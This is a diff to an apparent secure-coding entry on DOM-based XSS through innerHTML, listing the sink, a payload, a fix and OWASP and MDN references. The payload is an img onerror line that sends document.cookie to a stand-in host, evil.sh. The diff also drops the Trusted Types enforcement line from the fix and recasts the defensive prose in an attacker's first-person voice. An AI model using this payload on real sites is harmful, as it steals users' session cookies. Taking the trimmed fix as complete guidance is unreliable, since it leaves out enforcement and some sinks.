@@ -5,16 +5,15 @@ title: DOM XSS through innerHTML
 category: injection
 severity: critical
 sink: |-
-    element.innerHTML = userInput
+    el.innerHTML = user.bio
 payload: |-
     <img src=x onerror="fetch('//evil.sh?c='+document.cookie)">
 fix: |
-    element.textContent = userInput;
+    el.textContent = user.bio;
     // markup you must render → DOMPurify.sanitize(html)
-    // and enforce it: require-trusted-types-for 'script'
 refs:
     - https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
     - https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API
 ---
 
-`<script>` added through `innerHTML` never runs, but event handlers like `onerror` do. The same sink hides behind `v-html`, `dangerouslySetInnerHTML`, `insertAdjacentHTML`, `outerHTML` and `document.write`. Treat anything from the URL, `postMessage`, storage or an API as attacker-controlled.
+Your `<script>` tags don't run through `innerHTML`. My `onerror` does. I find the same door behind `v-html`, `dangerouslySetInnerHTML` and `insertAdjacentHTML`.
